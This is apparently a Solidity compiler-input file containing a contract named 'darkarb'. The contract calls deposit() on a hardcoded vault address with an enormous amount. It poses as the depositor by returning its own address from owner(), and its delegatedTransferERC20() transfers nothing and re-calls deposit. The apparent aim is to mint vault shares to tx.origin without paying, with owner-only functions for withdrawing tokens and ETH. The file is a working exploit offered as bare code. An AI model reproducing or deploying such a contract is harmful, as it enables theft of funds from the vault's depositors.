{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":true,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/dark1.sol":{"content":"pragma solidity =0.6.6;\r\npragma experimental ABIEncoderV2;\r\n\r\n\r\n\r\ninterface visor{\r\n\r\n    function deposit(\r\n            uint256 visrDeposit,\r\n            address payable from,\r\n            address to\r\n        ) external returns (uint256 shares);\r\n\r\n}\r\n\r\n\r\ncontract darkarb {\r\n\r\n    bool minted = true;\r\n\r\n    address payable public towner;\r\n    \r\n\r\n    constructor() public {\r\n        towner = msg.sender;\r\n        \r\n\r\n    }\r\n    \r\n    \r\n    modifier onlyowner{\r\n        require(msg.sender == towner);\r\n        _;\r\n    }\r\n\r\n    function owner() external returns(address r){\r\n\r\n        return(address(this));\r\n\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n\r\n    function deposit() payable external{\r\n    }\r\n\r\n\r\n    function _safeTransfer(address token, address to, uint value) private {\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(bytes4(keccak256(bytes('transfer(address,uint256)'))), to, value));\r\n    }\r\n    \r\n    function withdrawtoken(address tokenaddr, uint amount) external onlyowner{\r\n        _safeTransfer(tokenaddr, towner, amount);\r\n    }\r\n    \r\n\r\n    function withdrawethamount(uint amount) external onlyowner {\r\n        msg.sender.transfer(amount);\r\n    }\r\n\r\n\r\n\r\n\r\n    function delegatedTransferERC20(address t, address t2, uint256 amount) external{\r\n        if(minted){\r\n            minted = false;\r\n            visor(address(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef)).deposit( 100000000000000000000000000, address(this), tx.origin);\r\n\r\n        }\r\n        \r\n    }\r\n\r\n    function copyyou() external {\r\n        visor(address(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef)).deposit( 100000000000000000000000000, address(this), tx.origin);\r\n\r\n    }\r\n\r\n\r\n\r\n}"}}}